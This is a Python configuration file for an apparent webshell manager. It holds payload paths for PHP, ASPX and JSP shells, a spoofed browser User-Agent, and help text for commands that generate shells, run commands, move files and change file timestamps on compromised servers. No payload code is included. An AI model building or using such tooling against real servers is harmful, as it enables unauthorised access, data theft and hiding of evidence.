import os


class Conf:
    def __init__(self):
        pass

    # webshell file path
    WEBSHELL_FILE = "target.json"

    # request headers
    HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
    }

    # request timeout
    TIMEOUT = 10

    # generated webshell save path
    GENERATE_WEBSHELL_FILEPATH = os.path.dirname(__file__)+'/output/'

    SHELL_TEMPLATE_PATH = os.path.dirname(__file__)+'/shell/shellTemplate/'

    # shell payload path
    PHP_PAYLOAD_FILEPATH = os.path.dirname(__file__)+'/shell/payloads/php/'
    ASPX_PAYLOAD_FILEPATH = os.path.dirname(__file__)+'/shell/payloads/aspx/'
    JSP_PAYLOAD_FILEPATH = os.path.dirname(__file__)+'/shell/payloads/jsp/'

    MAIN_COMMAND = ['add','list', 'generate', 'remove', 'use','help', 'exit']

    # main menu help descrptinon
    HELP_TEXT_MAIN = {
        'add': (
            "Add a new webshell\n"
            "Usage: add [type] [url] [pass] [key] [header]"
        ),
        'use': (
            "Enter a webshell\n"
            "Usage: use [id]"
        ),
        'list': (
            "List all webshell"
        ),
        'generate':(
            'Generate Webshell\n'
            'Usage: generate [pass] [key]'
        ),
        'help': (
            'Show help\n'
            'Usage: help [command](optional)'
        ),
        'exit': (
            'Exit program'
        ),
        'remove': (
            'Remove webshell'
        ),
        None: (
            "Available commands:\n"
            "  add       - Add new webshell\n"
            "  list      - List all webshell\n"
            "  generate  - Generate webshell\n"
            "  remove    - Remove webshell\n"
            "  use       - Enter webshell\n"
            "  help      - Show help\n"
            "  exit      - Exit program"
        )
    }

    SUB_COMMAND = ['add', 'list', 'generate', 'info', 'help', 'back','remove', 'exit', 'use','ls','cat','cp','mv','upload','rm','execute','settime']

    HELP_TEXT_SUB = {
        'add': (
            "Add a new webshell.\n"
            "Usage: add [type] [url] [pass] [key] [header]"
        ),
        'list': (
            "List all webshell"
        ),
        'remove': (
            'Remove webshell\n'
            "Usage: remove [id]"
        ),
        'generate':(
            'Generate Webshell\n'
            'Usage: generate [pass] [key]'
        ),
        'use': (
            'Enter a new webshell\n"'
            'Usage: use [id]'),
        'info': (
            'Get webshell basic info'
        ),
        'back': (
            'Return to main menu'
        ),
        'exit': (
            'Exit program'
        ),
        'help': (
            'Show help\n'
            'Usage: help [command](optional)'
        ),
        'ls': (
            'List dir or file on webshell\n'
            'Usage: ls [filepath](optional)'
        ),
        'cat': (
            'cat file on webshell\n'
            'Usage: cat [filepath]'
        ),
        'cp': (
            'Copy file on webshell\n'
            'Usage: cp [srcFilepath] [destFilepath]'
            ),
        'mv': (
            'Move file on webshell\n'
            'Usage: mv [srcFilepath] [destFilepath]'
        ),
        'upload':(
            'Upload local file to webshell\n'
            'Usage: upload [localFilepath] [remoteFilepath]'
        ),
        'rm':(
            'Delete file on webshell\n'
            'Usage: rm [filepath]'
        ),
        'execute':(
            'Execute command on webshell\n'
            'Usage: execute [command] [args]'
        ),
        'settime':(
            'Set file time on webshell\n'
            'Usage: settime [filepath] [time](2025-10-12 11:06:47)'
        ),
        None: (
            "Available commands:\n"
            "  add          - Add new webshell\n"
            "  list         - List all webshell\n"
            "  generate     - Generate webshell\n"
            "  remove       - Remove webshell\n"
            "  use          - Enter webshell\n"
            "  info         - Get webshell basic info\n"
            "  help         - Show this help\n"
            "  back         - Return to main menu\n"
            '  ls           - List dir or file on webshell\n'
            '  cat          - Cat file on webshell\n'
            '  cp           - Copy file on webshell\n'
            '  mv           - Move file on webshell\n'
            '  upload       - Upload local file to webshell\n'
            '  rm           - Delete file on webshell\n'
            '  execute      - Execute command on webshell\n'
            '  settime      - Set file time on webshell\n'
            "  exit         - Exit program"
        )
    }

